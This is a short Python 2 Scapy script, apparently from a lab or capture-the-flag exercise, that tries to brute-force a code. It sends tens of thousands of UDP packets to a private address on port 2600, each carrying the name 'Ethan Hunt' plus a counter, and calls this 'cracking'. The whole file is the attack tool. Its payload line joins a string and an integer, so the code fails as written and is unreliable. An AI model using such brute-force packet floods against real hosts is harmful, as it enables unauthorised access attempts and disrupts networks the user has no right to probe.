from scapy.all import *
from scapy.layers.inet import *


def main():
    # Setup packet parameters
    target = "10.12.1.144"
    agent_name = "Ethan Hunt "
    ports = [3, 33, 333, 3333, 33333]

    print "Beginning cracking...\n"

    # First we craft a large number of packets using a random ephemeral port

    for p in ports:
        for i in range(10000):
            pkt = packet_craft(agent_name, i, p, target)
            send(pkt)
            print "Sent packet {:d} on port {:d}\n".format(i, p)

    print "Done cracking!\n"


def packet_craft(agent_name, code_attempt, source_port, target):
    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
    payload = agent_name + code_attempt
    pkt = IP(dst=target) / UDP(sport=source_port, dport=2600) / payload
    return pkt


if __name__ == '__main__':
    main()
